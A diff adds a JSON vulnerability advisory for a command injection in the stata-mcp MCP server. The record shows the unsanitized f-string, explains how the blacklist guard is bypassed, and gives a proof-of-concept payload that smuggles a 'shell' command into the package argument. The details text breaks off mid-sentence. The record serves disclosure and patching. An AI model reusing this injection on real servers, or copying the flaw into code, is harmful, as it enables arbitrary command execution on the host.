@@ -1,0 +1,59 @@
+{
+  "schema_version": "0.1.0",
+  "id": "AGT-2026-0046",
+  "modified": "2026-08-19T12:55:44.251660975Z",
+  "published": "2026-08-12T19:23:38Z",
+  "aliases": [
+    "GHSA-49m4-vp58-wgc9",
+    "CVE-2026-55071",
+    "PYSEC-2026-3700"
+  ],
+  "summary": "stata-mcp: MCP-for-Stata: Stata Command Injection via Unsanitized `package` in `ado_package_install`",
+  "details": "## Stata Command Injection via Unsanitized `package` in `ado_package_install`\n\n### Summary\n\nThe `ado_package_install` MCP tool in `stata-mcp` concatenates user-controlled input directly into a Stata command string without any validation or sanitization. An attacker who can invoke the MCP tool or the equivalent Python API can embed newline characters in the `package` argument to inject arbitrary Stata commands. Because Stata supports a `shell` escape command, this leads to full OS-level arbitrary command execution (RCE) under the account running the Stata-MCP server. The tool is registered in the default `all` profile, so no non-default configuration is required. Base CVSS score is **8.4 (High)**.\n\n### Details\n\nThe vulnerability originates in `SSC_Install.install()`:\n\n```python\n# src/stata_mcp/stata/builtin_tools/ado_install/ssc_install.py:14-16\ndef install(self, package: str) -> str:\n    install_command = f\"ssc install {package}{self.REPLACE_MESSAGE}\"\n    runner_result = self.controller.run(install_command)\n```\n\nThe `package` parameter is interpolated into an f-string with no allowlist check, newline rejection, or quoting. The resulting command string is forwarded to the Stata interpreter verbatim:\n\n```python\n# src/stata_mcp/stata/stata_controller/controller.py:98-99\n# Send the command\nself.child.sendline(command)\n```\n\n`pexpect.sendline()` writes the full multi-line string to the Stata REPL, which executes each line as a separate Stata command. Because Stata's `shell` (and `!`) commands execute an OS shell command, a newline-delimited payload results in OS command execution.\n\nThe full source-to-sink data flow is:\n\n1. **Exposure** — `src/stata_mcp/mcp_servers.py:626-632`: `_TOOL_REGISTRY` registers `ado_package_install` in the `all` profile.\n2. **Default activation** — `src/stata_mcp/cli/_handlers.py:295-300`: when no `--core`/`--all` flag is given the profile defaults to `all`, so the tool is always enabled.\n3. **Propagation** — `src/stata_mcp/mcp_servers.py:308-349`: the MCP argument `package` is passed to `installer(...).install(*args)` without validation.\n4. **Sink construction** — `src/stata_mcp/stata/builtin_tools/ado_install/ssc_install.py:15`: `package` is interpolated into `install_command`.\n5. **Delivery** — `src/stata_mcp/stata/stata_controller/controller.py:99`: `self.child.sendline(command)` sends the attacker-influenced string to Stata.\n\nA guard/blacklist (`src/stata_mcp/guard/blacklist.py:41-60`) registers `shell`, `!`, `winexec`, `unixcmd`, and similar strings as dangerous commands, but the `GuardValidator` that enforces this list is invoked **only** on the `stata_do` path and is not called anywhere in the ado-install path, making the guard entirely ineffective against this attack.\n\n### PoC\n\n**Prerequisites**\n\n- Unix-like host with a configured Stata CLI, **or** use the provided Docker image which replaces the Stata binary with a minimal Python stub (`fake_stata.py`) that honours the `shell` command.\n\n**Container-based reproduction (no Stata license required)**\n\n```bash\n# Build (run from the repository root)\ndocker build -t stata-mcp-poc-001 \\\n    -f vuln-001/Dockerfile \\\n    reports/pypiAi_828_SepineTam__stata-mcp/\n\n# Run\ndocker run --rm stata-mcp-poc-001\n```\n\n**Direct Python trigger (unmodified source)**\n\n```python\nimport os\nfrom stata_mcp.stata.builtin_tools.ado_install.ssc_install import SSC_Install\n\nMARKER = \"/tmp/stata_mcp_ado_poc\"\nPAYLOAD = f\"outreg2\\nshell touch {MARKER}\\n//\"\n\ninstaller = SSC_Install(\"/usr/local/bin/stata\", is_replace=True, timeout=10)\ninstaller.install(PAYLOAD)\n\nassert os.path.exists(MARKER), \"RCE not confirmed\"\nprint(\"RCE CONFIRMED — marker file created\")\n```\n\nThe payload `\"outreg2\\nshell touch /tmp/stata_mcp_ado_poc\\n//\"` is expanded by the f-string at `ssc_install.py:15` into:\n\n```\nssc install outreg2\nshell touch /tmp/stata_mcp_ado_poc\n//, replace\n```\n\nStata executes the second line as an OS shell command. The trailing `//` comment neutralises the `, replace` suffix so Stata does not\n\nImported from OSV GHSA-49m4-vp58-wgc9.",
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://osv.dev/vulnerability/GHSA-49m4-vp58-wgc9"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/SepineTam/mcp-for-stata/security/advisories/GHSA-49m4-vp58-wgc9"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/SepineTam/mcp-for-stata"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/SepineTam/mcp-for-stata/releases/tag/v1.19.0"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "stata-mcp"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.19.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "database_specific": {
+    "artifact_type": "mcp_server",
+    "classification": "vulnerable",
+    "verification": "verified",
+    "reporter": "osv-import",
+    "severity": "high"
+  }
+}
